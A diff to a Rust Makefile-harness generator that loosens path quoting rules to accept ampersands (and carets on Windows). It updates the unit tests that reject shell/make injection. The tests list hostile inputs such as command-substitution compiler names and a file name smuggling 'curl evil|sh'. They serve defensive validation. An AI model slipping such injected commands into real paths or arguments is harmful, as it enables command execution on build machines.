@@ -186,15 +186,24 @@ pub fn recipe_token(value: &str) -> String {
 
 /// Characters a filesystem path may contain once it is double-quoted, beyond
 /// those already safe bare: a space, the parentheses and apostrophe found in
-/// `C:/Program Files (x86)/...` and personal directory names, and the glob,
-/// brace, tilde and history characters (`* ? [ ] { } ~ !`). Inside double
-/// quotes `sh` treats each of them literally, and `make` only acts on them in
-/// rule targets and prerequisites, where a quoted path never appears. Even if a
-/// path were ever emitted unquoted they could only split, expand or break the
-/// command line, never start another command, which is why shell control
-/// operators (`;`, `|`, `&`, `<`, `>`) are not on this list although quoting
-/// would contain them too.
-const QUOTABLE_IN_PATH: &[char] = &[' ', '(', ')', '\'', '*', '?', '[', ']', '{', '}', '~', '!'];
+/// `C:/Program Files (x86)/...` and personal directory names, the ampersand of
+/// a `R&D/` or `Smith & Jones/` directory, and the glob, brace, tilde and
+/// history characters (`* ? [ ] { } ~ !`). On Windows the caret, which `cmd`
+/// takes literally inside double quotes, is one too. Inside double quotes `sh`
+/// and `cmd` treat each of them literally, and `make` only acts on them in rule
+/// targets and prerequisites, where a quoted path never appears: every place
+/// that writes a path into a recipe, a make variable a recipe expands, or a
+/// script renders it through [`recipe_path`] or a shell quoting of its own.
+/// The other shell operators (`;`, `|`, `<`, `>`) are left off although
+/// quoting would contain them too: no ordinary directory name carries them.
+#[cfg(not(windows))]
+const QUOTABLE_IN_PATH: &[char] = &[
+    ' ', '(', ')', '\'', '&', '*', '?', '[', ']', '{', '}', '~', '!',
+];
+#[cfg(windows)]
+const QUOTABLE_IN_PATH: &[char] = &[
+    ' ', '(', ')', '\'', '&', '^', '*', '?', '[', ']', '{', '}', '~', '!',
+];
 
 /// The first character of `value` that no quoting makes safe in a recipe path:
 /// a control character, or a metacharacter outside [`QUOTABLE_IN_PATH`]. That
@@ -208,8 +217,8 @@ fn first_unquotable_path_char(value: &str) -> Option<char> {
 
 /// Whether a filesystem PATH (source file, include dir, extra source, runtime
 /// dir, compiler) can be emitted into a generated Makefile: bare when it is
-/// plain, double-quoted by [`recipe_path`] when it carries a space, parenthesis
-/// or apostrophe. Paths reach recipes and make variables only, never a make
+/// plain, double-quoted by [`recipe_path`] when it carries a space, parenthesis,
+/// apostrophe or ampersand. Paths reach recipes and make variables only, never a make
 /// target or prerequisite while they need quoting.
 pub fn is_build_path_usable(value: &str) -> bool {
     first_unquotable_path_char(value).is_none()
@@ -224,7 +233,7 @@ pub fn ensure_build_path_safe(kind: &str, value: &str) -> Result<(), HarnessGenE
             "refusing to generate harness: {kind} {value:?} contains {c:?}, which cannot be \
              quoted safely in a build recipe (a shell/make metacharacter that could inject \
              commands); rename or move it to a path without that character (spaces, \
-             parentheses and apostrophes are supported)"
+             parentheses, apostrophes and ampersands are supported)"
         ))),
     }
 }
@@ -492,7 +501,7 @@ mod tests {
         for bad in [
             "clang++; id > PWNED.id; true",
             "id > /tmp/PWNED.id; clang++",
-            "clang++ && id",
+            "clang++ || id",
             "clang++`id`",
             "clang++$(id)",
             "clang++\nevil:\n\tid",
@@ -501,6 +510,11 @@ mod tests {
         ] {
             assert!(!is_compiler_token(bad), "{bad:?} must be rejected");
         }
+        // An ampersand is a path character (`/opt/R&D/bin/clang`): the
+        // Makefile names the compiler double-quoted, so one that carries `&&`
+        // is a single word naming no program, never a second command.
+        assert!(is_compiler_token("clang++ && id"));
+        assert_eq!(recipe_path("clang++ && id"), "\"clang++ && id\"");
     }
 
     /// Metadata is emitted as `NAME = <value>`; a newline would end the assignment
@@ -654,8 +668,12 @@ mod tests {
             "/tmp/a\nrun: ; id/a.c",
             "/tmp/a\tb/a.c",
             "src/a;curl evil|sh.c",
-            "/tmp/a&b/a.c",
             "/tmp/a>b/a.c",
+            "/tmp/a|b/a.c",
+            "/tmp/a<b/a.c",
+            // A backslash escapes in `sh`; on Windows it separates components.
+            #[cfg(not(windows))]
+            "/tmp/a\\b/a.c",
         ] {
             assert!(
                 !is_build_path_usable(hostile),
@@ -667,6 +685,48 @@ mod tests {
                 "the refusal names what was refused: {error}"
             );
         }
+    }
+
+    /// An ampersand is an ordinary directory-name character (`R&D/`,
+    /// `Smith & Jones/`). Inside the double quotes every path gets in a recipe
+    /// `sh` and `cmd` take it literally, so it is quoted, not refused, in a
+    /// path and in a compile flag, even next to an apostrophe.
+    #[test]
+    fn paths_with_an_ampersand_are_accepted_and_quoted() {
+        for path in [
+            "/home/dana/R&D/src/record.c",
+            "/srv/Smith & Jones/include",
+            "/srv/o'neil & co/include",
+        ] {
+            assert!(is_build_path_usable(path), "{path:?} must be usable");
+            assert!(
+                ensure_build_path_safe("include dir", path).is_ok(),
+                "{path:?}"
+            );
+            assert_eq!(recipe_path(path), format!("\"{path}\""));
+            assert!(is_compiler_token(path), "{path:?}");
+        }
+        for flag in ["-I/home/dana/R&D/include", "-I/srv/o'neil & co/include"] {
+            assert!(is_compile_flag_usable(flag), "{flag:?}");
+            assert!(ensure_all_compile_flags_safe([flag]).is_ok(), "{flag:?}");
+            let token = recipe_token(flag);
+            assert!(
+                token.starts_with(['\'', '"']),
+                "{flag:?} must be quoted: {token}"
+            );
+        }
+    }
+
+    /// `cmd.exe` takes `^` literally inside double quotes, as `sh` does, so a
+    /// Windows path may carry it; `%` (expanded by `cmd` even inside quotes)
+    /// stays refused.
+    #[cfg(windows)]
+    #[test]
+    fn windows_paths_with_a_caret_are_accepted_and_quoted() {
+        let path = "C:/Users/dana/R^D/src/a.c";
+        assert!(is_build_path_usable(path));
+        assert_eq!(recipe_path(path), format!("\"{path}\""));
+        assert!(!is_build_path_usable("C:/Users/dana/100%/src/a.c"));
     }
 
     #[test]
